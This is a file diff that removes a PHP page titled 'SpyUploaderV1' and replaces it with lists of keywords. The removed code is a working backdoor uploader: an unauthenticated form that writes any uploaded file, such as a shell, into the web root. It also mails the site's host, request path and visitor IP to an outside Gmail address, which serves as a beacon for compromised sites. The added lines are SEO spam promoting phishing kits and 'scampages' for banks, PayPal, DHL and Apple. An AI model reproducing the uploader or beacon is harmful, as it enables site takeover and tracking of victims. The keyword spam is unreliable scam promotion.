@@ -1,21 +1,6 @@
-<title>Vuln!! patch it Now! SpyUploaderV1</title>
-<?php
-echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
-if( $_POST['_upl'] == "Upload" ) {
-if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }
-else { echo '<b>Not uploaded ! </b><br><br>'; }
-}
-?>
-<?php
-$ip = getenv("REMOTE_ADDR");
-$ra44 = rand(1, 99999);
-$subj98 = " Bot v6 Rzlt |$ip";
-$email = "yrisgj@gmail.com";
-$from = "From: Result<botv3@mrspybotv3.com";
-$a45 = $_SERVER['REQUEST_URI'];
-$b75 = $_SERVER['HTTP_HOST'];
-$m22 = $ip . "";
-$msg8873 = "$a45 $b75 $m22";
-mail($email, $subj98, $msg8873, $from);
-?>
+phishing,phishing attack,phishing attacks,what is phishing,phishing tutorial,phishing emails,phishing demo,spear phishing,phishing email,phishing basics,icloud phishing script with admin panel,phishing website,how phishing works,how to prevent phishing,basic phishing tutorial,phishing explained,icloud template email script pishing,phishing for beginners,what is phishing attack,phishing tutorial kali linux,how to send phishing emails
+phishing,banca,bper banca,phishing scams,correntisti di banca intesa-sanpaolo,phishing email,{phishing},[phishing],what is phishing,phishing attack,phishing emails,email phishing scams,how phishing works,banche,real phishing email,phising,phishing scams explained,phishing scams how to avoid,what is a phishing email,[banca,{banca,bitcoin in banca,banca bper,banca betting exchange,betting exchange banca,banca mediolanum,bancari,banks
+LCL SCAMPAGE 2022
+scampage,scampages,apple scampage,scampage bank login,cara nebar scampage,2021 scampages,scampage apple,chase bank scampage 2021,paypal scampage,scampage 16shop,scampage apple japan,scampage apple clean,cara nebar scampage apple,9 banque,dhl scampage 2020,scampage apple 16 shop,banque hsbc canada,google api scampage link,la banque postal,scampage apple 2021 scampage amazon,scampage cc 2021 scam page paypal 2021 scampage cc
+stop arnaques france,arnaque,france,scampage,arnaques par email,dhl scampage 2020,google api scampage link,arnaque chiot,arnaques internet,9 banque,arnaqueur,arnaque téléphone,arnaques sur internet,arnaque mail la poste,attention aux arnaques par email,arnaque mail colissimo,la banque postal,éviter les arnaques sur internet,onedrive scam page,dhl new scam page,instagram scam,carte bancaire,instagram scammer,avoid instagram scam,ramon abbas
+scampage,dhl scampage 2020,google api scampage link,made in france,coronavirus france,finance,romance scam,onedrive scam page,dhl new scam page,romance scammer,j'analyse un site d'arnaque de masques ffp2 made in france,romance scam recovery,recover funds from romance scam,instagram scam,binance script,seager and hayes,champagne,scam,binance script clone,binance clone script,omega best scam,xocostume scam,scammer,scammed,binance
